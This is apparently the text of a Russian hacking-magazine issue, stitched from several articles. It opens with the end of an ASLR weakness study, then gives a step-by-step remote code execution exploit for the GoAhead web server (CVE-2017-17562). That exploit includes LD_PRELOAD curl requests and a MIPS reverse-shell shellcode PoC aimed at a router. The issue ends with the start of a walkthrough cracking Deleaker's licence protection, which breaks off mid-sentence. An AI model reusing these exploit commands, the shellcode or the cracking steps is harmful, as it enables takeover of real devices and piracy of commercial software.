   дерева vma для обхода списка допус тимых пустот gap и выбора случай‐
   ного адреса. В худшем случае при каждом выборе придется обходить все
   вершины, однако нет никаких дополнительных расходов на перес троение
   дерева.

Был выбран последний подход — использовать существу ющую структуру
организации vma без добавления избыточности и выбирать адрес по сле‐
дующему алгоритму:
 1. Использовать существующий алгоритм для нахождения возможной пус‐
   тоты gap, имеющей наибольший допустимый адрес. Также запомнить
   структуру vma, следующую за ней. Если такого нет, вернуть ENOMEM.
 2. Найденный gap запомнить как результат, а vma — как максимальную вер‐
  хнюю границу.
 3. Взять первую структуру vma из двусвязного списка. Она будет лис том
   в красно‐черном дереве, потому что имеет наименьший адрес.
 4. Совершить левосторонний обход дерева от выбранной vma, проверяя
   допустимость свободного региона между рас сматриваемой vma и ее
   предшественником. Если свободный реги он подходит по ограниче ниям,
   получить очередной бит энтропии. Если бит энтропии равен 1, переопре‐
   делить текущее выбранное значение пустоты gap.
 5. Вернуть случайный адрес из выбранно го реги она пустоты gap.

В качестве оптимизации в пункте 4 можно не заходить в поддеревья, размер
расширения gap которых мень ше необходимой длины.
  Данный алгоритм выбирает адрес с достаточным значением энтропии,
хотя и работает дольше текущей реализации.
  Из явных недостатков мож но отметить необ ходимость обхода всех vma,
имеющих достаточную длину пус тоты  gap. Однако это компенсируется
отсутствием  накладных  расходов  производитель ности  при  изменении
адресного пространства.


8. ТЕСТИРОВАНИЕ ИСПРАВЛЕНИЙ К ASLR
После применения описанных исправлений к ядру процесс /bin/less выг‐
лядит следующим образом:


314a2d0da000‐314a2d101000 r‐xp /lib/x86_64‐linux‐gnu/ld‐2.26.so
314a2d301000‐314a2d302000 r‐‐p /lib/x86_64‐linux‐gnu/ld‐2.26.so
314a2d302000‐314a2d303000 rw‐p /lib/x86_64‐linux‐gnu/ld‐2.26.so
314a2d303000‐314a2d304000 rw‐p
3169afcd8000‐3169afcdb000 rw‐p
316a94aa1000‐316a94ac6000 r‐xp /lib/x86_64‐linux‐gnu/libtinfo.so.5.9
316a94ac6000‐316a94cc5000 ‐‐‐p /lib/x86_64‐linux‐gnu/libtinfo.so.5.9
316a94cc5000‐316a94cc9000 r‐‐p /lib/x86_64‐linux‐gnu/libtinfo.so.5.9
316a94cc9000‐316a94cca000 rw‐p /lib/x86_64‐linux‐gnu/libtinfo.so.5.9
3204e362d000‐3204e3630000 rw‐p
4477fff2c000‐447800102000 r‐xp /lib/x86_64‐linux‐gnu/libc‐2.26.so
447800102000‐447800302000 ‐‐‐p /lib/x86_64‐linux‐gnu/libc‐2.26.so
447800302000‐447800306000 r‐‐p /lib/x86_64‐linux‐gnu/libc‐2.26.so
447800306000‐447800308000 rw‐p /lib/x86_64‐linux‐gnu/libc‐2.26.so
447800308000‐44780030c000 rw‐p
509000396000‐509000d60000 r‐‐p /usr/lib/locale/locale‐archive
56011c1b1000‐56011c1d7000 r‐xp /bin/less
56011c3d6000‐56011c3d7000 r‐‐p /bin/less
56011c3d7000‐56011c3db000 rw‐p /bin/less
56011c3db000‐56011c3df000 rw‐p
56011e0d8000‐56011e0f9000 rw‐p [heap]
7fff6b4a4000‐7fff6b4c5000 rw‐p [stack]
7fff6b53b000‐7fff6b53e000 r‐‐p [vvar]
7fff6b53e000‐7fff6b540000 r‐xp [vdso]
ffffffffff600000‐ffffffffff601000 r‐xp [vsyscall]

На примере видно:
 1. Все библиотеки выделены в случайных местах, находятся на случайном
   друг от друга расстоянии.
 2. Файл /usr/lib/locale/localearchive, отображенный с помощью
  mmap, также находится по случайным адресам.
 3. «Дыра»   в  /lib/x86_64linuxgnu/ld2.26.so  не   заполнена
   ни одним отображением mmap.

Данный патч был протес тирован на системе Ubuntu 17.04 с запущенными
браузерами Chrome и Mozilla Firefox. Никаких проблем обнаружено не было.


9. ЗАКЛЮЧЕНИЕ
В результате иссле дова ния было обна ружено мно го особенностей в работе
ядра и glibc при обслуживании кода программ. Была сформулирована и рас‐
смотрена проблема близкого рас положения памяти. Были найдены сле‐
дующие проблемы:
 • Алгоритм выбора адреса mmap не содержит энтропии.
 • Загрузка ELF‐файла в ядре и интерпретато ре содержит ошибку обработки
   сегментов.
 • При  поиске  адреса  функцией  do_mmap  в  ядре  не  учи тывается
   mmap_min_addr в архитектуре x86‐64.
 • Загрузка ELF‐файла в ядре допус кает соз дание «дырок» в ELF‐файле
   программы и интерпретаторе ELF‐файла.
 • Интерпретатор ELF‐файла из GNU Libc ld, исполь зуя mmap для выделения
   памяти   для  библиотек,   загружает  биб лиоте ки  по   зависящим
   от mmap_base адресам. Также библиотеки загружаются в строго опре‐
   деленном порядке.
 • Библиотека GNU Libc, используя mmap для выделения стека, кучи и TLS
   потока, также располагает их по завися щим от mmap_base адре сам.
 • Библиотека GNU Libc раз мещает TLS потоков, созданных c помощью
   pthread_create, в начале стека, что поз воляет обойти защиту от перепол‐
   нения буфера на стеке, переписав «канарейку».
 • Библиотека GNU Libc кеширу ет ранее выделенные кучи (стеки) потоков,
   что позволяет в некото рых случаях успешно завершить экс плуатацию уяз‐
   вимого приложения.
 • Библиотека GNU Libc соз дает кучу для новых потоков, выровненную
   на 226, что снижает мощность перебора.

Данные проблемы помогают зло умышленнику при обходе ASLR или при обхо‐
де защиты от перепол нения буфера на стеке. Для некоторых выявленных
проблем были предложены исправления в виде патчей к ядру.
  Для всех проб лем были представлены PoC. Был предложен алгоритм
выбора адреса, подразумевающий достаточный уровень энтропии. Про‐
демонстрированный подход может быть использован для анализа ASLR
в других операционных системах, например Windows или macOS.
  Был рассмот рен ряд осо бен ностей реализации GNU Libc, знание которых
в ряде случаев позволяет упростить экс плуатацию при ложе ний.
  Продемонстрированный подход может быть использован для анализа
поведения ASLR в других операционных системах, таких как Windows, macOS
и Android.


        WWW

                            1. Erik Buchanan, Ryan Roemer, Stefan Savage, Ho‐
                           vav Shacham. Return‐Oriented Programming: Ex‐
                                 ploits Without Code Injection
                            2. xorl
                            3. Reed Hastings, Bob Joyce. Purify: Fast Detection
                               of Memory Leaks and Access Errors
                            4. Improper   Restriction   of   Operations   within
                            the Bounds of a Memory Buffer
                            5. AMD Bulldozer Linux ASLR weakness: Reducing
                            entropy by 87.5%
                            6. Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu‐
                           Ghazaleh. Jump Over ASLR: Attacking Branch
                             Predictors to Bypass ASLR
                            7. Hector Marco‐Gisbert, Ismael Ripoll. Offset2lib:
                          bypassing full ASLR on 64bit Linux
                            8. Hector Marco‐Gisbert, Ismael Ripoll‐Ripoll. ASLR‐
                       NG: ASLR Next Generation
                            9. Doubly linked list
                         10. Bayer, Rudolf. Symmetric binary B‐Trees: Data
                              structure and maintenance algorithms
                           11. Lespinasse, Michel. Mm: use augmented rbtrees
                                 for ﬁnding unmapped areas
                         12. Integer Overﬂow or Wraparound
                          13. Classic Buffer Overﬂow
                          14. Incorrect Type Conversion or Cast
                         15. CVE‐2014‐9427
                         16. Security Enhancements in Android 7.0
                          17. Implement Library Load Order Randomization
                         18. Thread‐Local Storage
                         19. One,  Aleph.  Smashing  The  Stack  For  Fun
                       And Proﬁt
                        20. Fritsch, Hagen. Buffer overﬂows on linux‐x86‐64
                         21. Litchﬁeld, David. Defeating the Stack Based Buf‐
                                 fer Overﬂow Prevention
                        22. Maxim Goryachy, Mark Ermolov. HOW TO HACK
                     A TURNED‐OFF COMPUTER, OR RUNNING
                        23. Use After Free
                        24. ELF
                        25. Hocko, Michal. Mm: introduce MAP_FIXED_SAFE
                        26. Use of Uninitialized Variable
ВЗЛОМ





        aLLy
       ONsec
     @iamsecurity



ЭКСПЛУАТИРУЙ,
GOAHEAD!
ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
В ВЕБ‐СЕРВЕРЕ GOAHEAD




 GoAhead — это популярный встраиваемый веб‐сервер ком‐
 пании Embedthis, который используется в продуктах Oracle,
 IBM, HP и других известных про изводителей. Я думаю,
 не нужно  говорить,  какие перспективы открывает  воз‐
 можность исполнять про извольный код на сотнях тысяч
 устройств, где они работа ют. Давай разберемся, как это
 делается.


 Баг обнаружил австралийский исследова тель Дэниел Ходсон (Daniel Hodson)
 из компании Elttam. Причина уязвимости — в некорректной обработке HTTP‐
 запросов при вклю ченной поддержке интерфейса CGI. При инициализации
 окружения некоторых CGI‐скриптов существует возможность использования
 специальных переменных окру жения типа LD_PRELOAD, с помощью которых
 можно выполнить код.


             INFO

                        Уязвимость получила иден тификатор CVE‐2017‐
                       17562.



 ГОТОВИМ СТЕНД
 Для начала опре делимся с версией самого веб‐сервера. Уязвимы все версии
 приложения ниже  3.6.5. Так что будем исполь зовать самую последнюю
 до  патча —  3.6.4. В  качес тве  системы  я  буду  использовать  Debian
 9 в докер‐контейнере.


 docker run ‐‐rm ‐ti ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt
 seccomp=unconfined ‐‐name=goahead ‐‐hostname=goahead ‐p80:80 debian /
 bin/bash
 apt‐get update && apt‐get install ‐y build‐essential git file

 Теперь  ставим  веб‐сервер.  Будем  собирать  из  исходников,  взятых
 в гит‐репозитории.


 git clone ‐‐branch=v3.6.4 ‐‐depth=1 https://github.com/embedthis/
 goahead.git
 cd goahead
 DEBUG="debug" make

 Теперь скомпилим тестовое CGI‐приложение.


 cd test
 gcc cgitest.c ‐o cgi‐bin/cgitest

 Запустить сервер можно из папки  test, там лежат дефолтные конфиги
 для работы GoAhead.


 ../build/linux‐x64‐default/bin/goahead

 Скомпилированное приложение будет дос тупно на запущенном сервере
 по ссылке /cgi‐bin/cgitest.





           Тестовое CGI‐приложение на сервере GoAhead 6.3.4

 Если тебе захочется вмес те со мной заглянуть в исходники веб‐сервера, то
 их ты всегда сможешь найти в официальном репозитории Embedthis.


 ОСОБЕННОСТИ КОМПИЛЯЦИИ И ЛИНКОВАНИЯ
 Для начала посмотрим, как устроен бинарник goahead. Для этого можно вос‐
 пользоваться утилитой readelf или file.


 readelf ‐hl goahead





            Детальная информация о бинарнике goahead

 Обрати внимание на секцию INTERP. Она говорит нам о том, что ELF‐файл
 был скомпилирован с динамической линковкой библиотек, а в качестве
 интерпретатора для ее выполнения используется биб лиотека ld‐linux‐x86‐
 64.so.2.


 root@goahead:~/goahead/build/linux‐x64‐default/bin# file goahead
 goahead: ELF 64‐bit LSB shared object, x86‐64, version 1 (SYSV),
 dynamically linked, interpreter /lib64/ld‐linux‐x86‐64.so.2, for GNU/
 Linux 2.6.32, BuildID[sha1]=c29d5dc68c84bafc997dd15d4e22c3dab634afae,
  not stripped

 Эта библиотека — динамичес кий компоновщик, который выполняется в пер‐
 вую очередь при запуске исполня емого файла и отвечает за линковку и заг‐
 рузку разделяемых библиотек (so) и символов. Чтобы узнать, какие библиоте‐
 ки подгружаются при старте веб‐сервера, можно воспользоваться утилитой
 ldd  или  запустить  goahead,  установив  переменную  окру жения  LD_‐
 TRACE_LOADED_OBJECTS в 1.





  Информация о подгружаемых библиотеках при запуске веб‐сервера
   GoAhead

 Как  ты, наверное, знаешь, переменных окружения великое множес тво,
 но среди них есть специальные, которые могут изменить дефолтное поведе‐
 ние ступеней загрузки исполняемого файла. Подробнее о них ты можешь
 прочитать в мануале к файлу ld.so.
   Давай пробежимся по исходникам и пос мотрим, каким образом перемен‐
 ные влияют на работу приложения. Для этого заглянем в библиоте ку glibc,
 исходники которой ты можешь найти в этом репози тории.
   Первая остановка — это функция dl_main, которая выполняется сразу
 после запуска линкера.


 /glibc/master/elf/rtld.c
 733: static void
 734: dl_main (const ElfW(Phdr) *phdr,
 735:     ElfW(Word) phnum,
 736:     ElfW(Addr) *user_entry,
 737:     ElfW(auxv_t) *auxv)
 738: {
 ...
 772:   /* Process the environment variable which control the behavi
 our.  */
 773:   process_envvars (&mode);

 Здесь вызывается функция process_envvars. Да, она делает то, что и сле‐
 дует из ее названия, — парсит и обра батывает переменные окру жения.


 /glibc/master/elf/rtld.c
 2341: static void
 2342: process_envvars (enum mode *modep)
 2343: {
 2344:   char **runp = _environ;
 2345:   char *envline;
 2346:   enum mode mode = normal;
 2347:   char *debug_output = NULL;
 ...
 2353:   while ((envline = _dl_next_ld_env_entry (&runp)) != NULL)
 2354:     {
 2355:       size_t len = 0;
 2356:
 2357:       while (envline[len] != '\0' && envline[len] != '=')
 2358:   ++len;

 Перебирается массив, сос тоящий из переменных окружения. Для каждого
 элемента вычисляется его раз мер, а дальше функция switch, в зависимости
 от длины параметра, передает управление на раз личные ветки кода, где
 выясняется, не передана ли одна из специаль ных переменных. Нас больше
 всего интересует длина 7, где расположилась проверка на LD_PRELOAD
 в переданной командной стро ке.


 /glibc/master/elf/rtld.c
 2366:       switch (len)
 2367:   {
 ...
 2385:   case 7:
 ...
 2393:     /* List of objects to be preloaded.  */
 2394:     if (memcmp (envline, "PRELOAD", 7) == 0)
 2395:       {
 2396:         preloadlist = &envline[8];
 2397:         break;
 2398:       }

 Если эта перемен ная окру жения передана, то инициализируется preload‐
 list. По сути, в ней хра нится список биб лиотек, которые нужно загрузить
 перед тем, как передавать управление главному коду из бинарника. Поэтому
 вскоре после того, как отра бота ла process_envvars, выпол нение переходит
 к той части кода, что начина ет обработку preloadlist.


 /glibc/master/elf/rtld.c
 1478:   assert (*first_preload == NULL);
 1479:   struct link_map **preloads = NULL;
 1480:   unsigned int npreloads = 0;
 1481:
 1482:   if (__glibc_unlikely (preloadlist != NULL))
 1483:     {

 Если список непустой, то функция do_preload выпол няет загрузку каждой
 переданной библиотеки.


 /glibc/master/elf/rtld.c
 1495:       while ((p = (strsep) (&list, " :")) != NULL)
 1496:   if (p[0] != '\0'
 1497:       && (__builtin_expect (! __libc_enable_secure, 1)
 1498:       || strchr (p, '/') == NULL))
 1499:     npreloads += do_preload (p, main_map, "LD_PRELOAD");

 Теперь мы знаем, что, если ука зать в переменной LD_PRELOAD путь до биб‐
 лиотеки, линкер выполнит ее загрузку перед исполнением самого бинарника.
 Однако нам этого недостаточно, ведь задача не в том, чтобы просто под‐
 цепить либу, требуется еще и выполнить нуж ный нам код. В этом нам помогут
 секции .init и .fini. Если функция помещена в секцию .init, то система
 выпол няет ее до главной (main), а если в .fini, то после того, как main отра‐
 ботает и вернет результат. Сво еобразная имплементация конструкторов
 и деструкторов классов, только глобальная.
   Теперь воспользуемся атрибута ми функций. Нужный нам называется con‐
 structor.


 payload.c
 1: #include <unistd.h>
 2:
 3: static void before_main(void) __attribute__((constructor));
 4:
 5: static void before_main(void)
 6: {
 7:     write(1, "Hello: World!\n", 14);
 8: }
 9:

 Функция before_main будет вызываться сразу же пос ле загрузки библиотеки,
 до главного бинарника. Давай скомпилируем этот код как библиотеку.


 gcc ‐shared ‐fPIC payload.c ‐o payload.so

 Теперь попробуем подключить эту библиотеку перед стартом веб‐сервера,
 используя LD_PRELOAD.


 LD_PRELOAD=/root/payload.so ../build/linux‐x64‐default/bin/goahead





   Вызываем свою библиотеку через переменную окружения LD_PRELOAD

 И наблюдаем, как в stdout появилась строка из пейлоада: «Hello: World!».
 Тот же самый трюк спра ведлив для любого фай ла с динамическим лин‐
 кованием.





      Трюк с подгрузкой биб лиотеки работает и на дру гих бинарниках



                                      Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ЭКСПЛУАТИРУЙ,
           GOAHEAD!
               ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
                       В ВЕБ‐СЕРВЕРЕ GOAHEAD





АТАКУЕМ CGI
Вооружившись необ ходимыми зна ниями, перехо дим непосредственно к ата‐
кам на CGI‐приложения. Для обработки запросов к ним используется фун‐
кция cgiHandler.


cgi.c
51: PUBLIC bool cgiHandler(Webs *wp)
52: {
53:     Cgi         *cgip;
54:     WebsKey     *s;
55:     char        cgiPrefix[ME_GOAHEAD_LIMIT_FILENAME], *stdIn, *
stdOut, cwd[ME_GOAHEAD_LIMIT_FILENAME];
56:     char        *cp, *cgiName, *cgiPath, **argp, **envp, **ep, *
tok, *query, *dir, *extraPath, *exe;
57:     CgiPid      pHandle;
58:     int         n, envpsize, argpsize, cid;

Она инициализирует массив envp, в который в формате ключ‐значение
записываются все парамет ры, переданные в запросе по HTTP.


cgi.c
160:     envpsize = 64;
161:     envp = walloc(envpsize * sizeof(char*));
162:     for (n = 0, s = hashFirst(wp‐>vars); s != NULL; s = hashNext
(wp‐>vars, s)) {
163:         if (s‐>content.valid && s‐>content.type == string &&
164:             strcmp(s‐>name.value.string, "REMOTE_HOST") != 0 &&
165:             strcmp(s‐>name.value.string, "HTTP_AUTHORIZATION")
!= 0) {
166:             envp[n++] = sfmt("%s=%s", s‐>name.value.string, s‐>
content.value.string);
167:             trace(5, "Env[%d] %s", n, envp[n‐1]);
168:             if (n >= envpsize) {
169:                 envpsize *= 2;
170:                 envp = wrealloc(envp, envpsize * sizeof(char *))
;
171:             }
172:         }
173:     }
174:     *(envp+n) = NULL;

После всех необходимых приготовлений вызыва ется функция launchCgi.
В качестве одного из аргу ментов ей переда ется полученный массив.


cgi.c
194:     if ((pHandle = launchCgi(cgiPath, argp, envp, stdIn, stdOut)
) == (CgiPid) ‐1) {

Внутри этой функции уже выполняется fork и, наконец, execve для запуска
бинарника. Причем данные из массива envp передаются ему в качес тве
переменных окружения.


cgi.c
533: static CgiPid launchCgi(char *cgiPath, char **argp, char **envp,
 char *stdIn, char *stdOut)
534: {
...
548:     pid = vfork();
549:     if (pid == 0) {
...
561:         } else if (execve(cgiPath, argp, envp) == ‐1) {
562:             printf("content‐type: text/html\n\nExecution of cgi
process failed\n");
563:         }

Таким образом, переданный GET‐запрос на  ``/test.cgi?A=B превратится
в вызов.


A=B /path/to/test.cgi





  Параметры запроса переда ются в качес тве переменных окру жения
  при запуске CGI‐скрипта

Соединяем две половинки вмес те и пробуем подгрузить пейлоад с «хело‐
уворлдом» к скрипту cgitest, который мы скомпилили в самом начале
статьи.


curl "http://goahead.visualhack/cgi‐bin/cgitest?LD_PRELOAD=/root/
payload.so" ‐I





          Инъекция библиотеки в GoAhead через LD_PRELOAD

Библиотека загружена, код выполнен, а результат выполнения возвращается
в ответе в качестве хидера (именно для этого строка име ет символ : после
слова hello).


ТРЮКИ ДЛЯ УДАЛЕННОЙ ЭКСПЛУАТАЦИИ
Инжектить библиотеки мы научились, но как же нам теперь проэксплуати‐
ровать эту уязвимость удален но? Очевидно, что возможность заливать свои
файлы с произвольным содержимым доступна далеко не всегда. Тут нас сно‐
ва выручает сам GoAhead. Во время выполнения launchCgi функция dup2
дублирует дескриптор stdin.


cgi.c
539:     if ((fdin = open(stdIn, O_RDWR | O_CREAT | O_BINARY, 0666))
< 0) {
540:         error("Cannot open CGI stdin: ", cgiPath);
541:         return ‐1;
542:     }
...
553:         if (dup2(fdin, 0) < 0) {
554:             printf("content‐type: text/html\n\nDup of stdin
failed\n");

Он указывает на временный файл, в котором содержится тело отправленного
запроса POST. Это значит, что в директории /tmp лежит файл с наз ванием
вида cgi‐XXXXXX, в котором находят ся переданные пользовательские дан‐
ные. То есть ты можешь отправить POST‐запрос на любой CGI‐скрипт и в
теле передать содержимое скомпилированной полезной нагрузки, чтобы
подгрузить библиотеку с помощью LD_PRELOAD=/tmp/cgi‐XXXXXX. Что‐то
примерно такое:


curl ‐X POST ‐‐data‐binary @payload.so http://goahead.visualhack/
cgi‐bin/cgitest?LD_PRELOAD=/tmp/cgi‐XXXXXX

Тут мы натыкаемся на еще одни граб ли — сбру тить название файла проб‐
лематично, но и здесь есть выход. Линуксовая фай ловая подсистема procfs,
в директории /proc/PID/fd, создает для каждого выпол няемого процесса
симлинки на открытые файловые дес крипторы. Нулевой дескриптор (/proc/
PID/fd/0) будет указывать на нужный нам временный файл, и мы можем лег‐
ко использовать это при эксплуата ции. PID процесса нам знать не нужно, так
как есть сущность self, и она указывает на текущий. Получается вот такой век‐
тор атаки.


curl ‐X POST ‐‐data‐binary @payload.so http://goahead.visualhack/
cgi‐bin/cgitest?LD_PRELOAD=/proc/self/fd/0 ‐i | head





                  Уда ленная экс плуатация GoAhead

Как видишь, можно использовать и /dev/stdin, результат аналогичный.


АТАКУЕМ РОУТЕР
Теперь можно добавить полезную нагрузку посерь езнее. Сделаем это на
примере китайского роутера LB‐LINK BL‐WR3000A. Для начала скачаем его
прошивку с официального сайта производителя. После этого рас пакуем про‐
шивку при помощи утилиты binwalk.


binwalk ‐e WR3000A(5)_628‐SD‐EN‐1.0.9‐upgrade





         Распаковка про шивки для роутера LB‐LINK BL‐WR3000A

Тут нас интересует файл 412000 — в нем находится файловая система роуте‐
ра, он распаковывается архиватором 7z. Затем можно запустить поиск фай‐
лов с расширением cgi. Не буду томить и ска жу, что фай лы лежат в папке /
etc_ro/web/cgi‐bin.
   Эти скрипты — потенциальные  точки вхо да для проведения  атаки.
К сожалению, они доступны только пос ле авто риза ции на роуте ре, но нам
это неважно, для демонс трации уязвимос ти хватит и такого примера. :‐)
   Дальше нужно узнать, какой Linux установлен на роуте ре. Это можно про‐
верить утилитой file, натравив ее на любой бинарник, например из дирек‐
тории bin.


file bin/busybox
busybox: ELF 32‐bit LSB executable, MIPS, MIPS32 rel2 version 1 (
SYSV), dynamically linked, interpreter /lib/ld‐uClibc.so.0, stripped

Хорошо, теперь нам нужно вос пользовать ся утилитой buildroot, чтобы ском‐
пилировать библиотеку с пейлоадом под MIPS. Для этого понадобится пос‐
тавить несколько дополнительных пакетов и подождать полчаса компиляции.
:) Или можешь поставить пакет gcc‐mipsel‐linux‐gnu — он тоже сделает свою
работу.


apt‐get install ‐y file cpio python bc libncurses5‐dev

Следующий шаг — генерация пейлоада. Сделать это можно с помощью
пакета RSF (The Router Exploitation Framework). В обращении эта шту ка ана‐
логична MSF: выбираем пейлоад, вводим данные, ставим формат пей лоада
и получаем готовый код. В качес тве нагрузки я буду использовать бэк‐
коннект‐шелл.





                 Генера ция кода шелла для эксплоита

Теперь встав ляем полученный код в наш PoC. И на месте функции вывода
строки «Hello World» вызываем его. Получится что‐то вроде этого.


poc-mipsel.c
01: #include <stdio.h>
02: #include <unistd.h>
03:
04: unsigned char sh[] = {
05:   "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04"
06:   "\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20"
07:   "\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27"
08:   "\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24"
09:   "\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09"
10:   "\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x7a\x69\x05\x3c\x02\x00"
11:   "\xa5\x34\xf8\xff\xa5\xaf\x63\x01\x05\x3c\xc0\xa8\xa5\x34\xfc"
12:   "\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01"
13:   "\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08"
14:   "\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff"
15:   "\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec"
16:   "\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23"
17:   "\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09"
18:   "\x01"
19: };
20:
21: static void before_main(void) __attribute__((constructor));
22:
23: static void before_main(void)
24: {
25:   (*(void(*)()) sh)();
26: }

Теперь компилируем для нуж ной архитектуры с помощью buildroot.


./buildroot‐2017.11.2/output/host/bin/mipsel‐linux‐gcc ‐shared ‐fPIC
poc‐mipsel.c ‐o poc‐mipsel.so





                  Компиляция бэкконнект‐шелла

А теперь слушаем указанный порт и отправляем библиотеку с бэкшеллом
через запрос к CGI‐скрипту уже извес тным нам спо собом.


curl ‐X POST ‐‐data‐binary @poc‐mipsel.so http://router.visualhack/
cgi‐bin/upload.cgi?LD_PRELOAD=/proc/self/fd/0 ‐i | head

И к нам приходит коннект.





              Успешная эксплуата ция. Бэкконнект при шел!


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Веб‐сервер GoAhead популярен и используется во множестве устройств —
в том числе роутеров. Shodan на ходит более 700 тысяч устройств по кейвор‐
ду GoAhead. Разумеется, разработчики быстро отреагировали на проблему
и выпустили патч, который запрещает использовать потенциально опасные
переменные окружения в запросах. Также вышла новая версия дистрибути‐
ва 3.6.5, в которой уязвимость исправлена. Так что поспеши обновиться, если
являешься счастливым пользователем бажного приложе ния.
ВЗЛОМ





     OnLyOnE
onlyone.rnd@gmail.com
DELEAKER,
НЕ БОЛЕЙ!
ЛОМАЕМ ЗАЩИТУ В ОБХОД VM‐
PROTECT И ПИШЕМ PROXY DLL




Не так давно на глаза мне попалась прог рамма Deleaker.
Софтина, из описания на сайте, предназначена для поиска
 в приложениях утечек памяти, GDI‐ресурсов и незакрытых
 хендлов. А мне ста ло интересно, как у нее обстоят дела
 с защитой от взлома.


            WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                       не несут ответственности за любой возможный
                         вред, причинен ный материалами данной статьи.


             INFO

                     Подробнее о Deleaker можешь узнать в этом пос‐
                          те. А в конце этой статьи тебя ждет скидка 50%
                        на  эту  программу...  от самих  разработчиков
                           Deleaker!


 На сайте я скачал триальную версию и запросил для нее пробный ключ,
 который мне и прислали на имейл. Теперь можно начинать изу чение прог‐
 раммы и ее механизма регистрации.


 Greetings
 Мои благодарности завсегдатаям форума exelab.ru:
 • Mak;
 • VodoleY;
 • ELF_7719116;
 • Kindly

 и многим другим.





                                      Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

           DELEAKER,
          НЕ БОЛЕЙ!
            ЛОМАЕМ ЗАЩИТУ В ОБХОД VMPROTECT
                         И ПИШЕМ PROXY DLL





ПРОЦЕСС
Программа устанавливается в директорию C:\Program Files  (x86)\De‐
leaker как standalone, хотя есть вариант интегра ции Deleaker в Visual Studio
в виде дополнения (.vsix). Но я не пользуюсь Visual Studio, и для меня такой
способ был недоступен.





В директорию были установлены такие файлы.





Запускаем программу и вводим прис ланный ключ. Софтина обе щает нам
пробный период использования.





Замечательно. :)


Инс тру мен ты, которые нам понадо бят ся
 • x64dbg — отладчик;
 • DIE aka Detect It Easy — анализа тор фай лов;
 • CFF Explorer — PE‐редактор;
 • MASM — компилятор.



Итак, проверив все исполняемые фай лы ана лизатором DIE, в директории
установленной программы находим две DLL’ки, «накрытые» VMProtect:
 • deleakersdk32.dll;
 • deleakersdk64.dll.





Я предположил, что механизм (код) лицензирования (регистрации) находится
именно в них.


Зачем нуж ны две DLL’ки?
Забегу вперед: DLL’ки идентичны, единственное раз личие — одна 32‐битная,
другая 64‐битная. Механизм лицензирова ния (регистрации) используется
только из deleakersdk32.dll, что облегчает нашу задачу.


Далее я открыл deleakersdk32.dll в CFF Explorer и зашел в директорию Export.
Там нашлись четыре экспортиру емые функции с говорящими именами.





Эти функции как раз и отвечают за лицензирование (регистрацию) прог‐
раммы.
  Все бы хорошо, если бы файл  Deleaker.exe,  который, собственно,
и использует в данном случае deleakersdk32.dll, не был написан на .NET,
а сама DLL — на Visual C++. То есть запус тить Deleaker.exe напрямую
в отладчике x64dbg у нас не получит ся.
  Но это не беда, мы просто запускаем Deleaker.exe и аттачимся к процессу
x64dbg.
  В окне Symbols отладчика, в левой половине находим и выделяем кур‐
сором нашу DLL. Справа мы увидим список ее импортируемых и экспортиру‐
емых функций. Нас интересуют только те, что мы обна ружили ранее в CFF Ex‐
plorer. Выделяя по очереди курсором функции, нажимаем клавишу F2, тем
самым устанавливая точ ки останова (breakpoints) на начало исполнения кода
этих функций.





После этого возвращаемся в окно Deleaker. Кликаем Help → About.
  В отладчике останавливаемся в начале функции DeleakerSDK_IsRegis‐
tered. Эта функция, по логике, должна воз вра щать флаг TRUE или FALSE.
Прокрутив в отладчике функцию до конца, видим, что программа откры вает
и читает файл ключа DeleakerLicense.key в директории C:\ProgramData\De‐
leaker.
  Файл содержит проб ный регистрационный ключ, который я ввел раньше
в программе. В отладчике, в окне стека (пра вый нижний угол) кликаем по пер‐
вому адре су правой кноп кой мыши, выбира ем Follow DWORD in Disassembler
и в окне CPU отладчика ока зываемся на адресе, куда поток вернется пос ле
выхода из функции. Уста навлива ем на этом адресе точку останова, нажав
клавишу F2.





Далее отпускаем поток нажатием клавиши F9. Отладчик останавливается
на данном адре се, и в регистре EAX мы видим TRUE, запоминаем это.





Опять нажимаем F9, и отладчик вста ет уже на второй функции DeleakerSD‐
K_GetRegisteredUserName. Из наз вания понят но, что функция возвращает
имя зарегистрированного пользователя. В функцию передается указатель
на ячейку памяти, куда функция должна вер нуть указатель на буфер с именем
пользователя. Этот буфер обязательно должен быть выделен в памяти API
SysAllocString.
  В окне стека кликаем пра вой кнопкой мыши по адресу, который рас‐
полагается ниже адреса возвра та из функции. Выбираем из списка Follow
in Dump и в окне дампа памяти по адресу в стеке видим пустую ячейку — вот
там и должен оказаться адрес буфера.





Далее перемещаемся в окне отладчика CPU на адрес возврата из функции
и ставим там точку оста нова. «Отпускаем» отладчик и останавливаемся
на выходе из функции. Видим, что в ячейке памяти появился адрес буфера и в
EAX у нас TRUE, — это говорит об «удачном» завершении функции.





В окне дампа кликаем опять правой кнопкой мыши по адресу в ячейке памяти
и выбираем Follow DWORD in Current Dump.





Мы попадаем непосредственно в буфер памяти, где в формате double char
или  Unicode  находится  сообщение,  что  срок  пробной  версии  исте‐
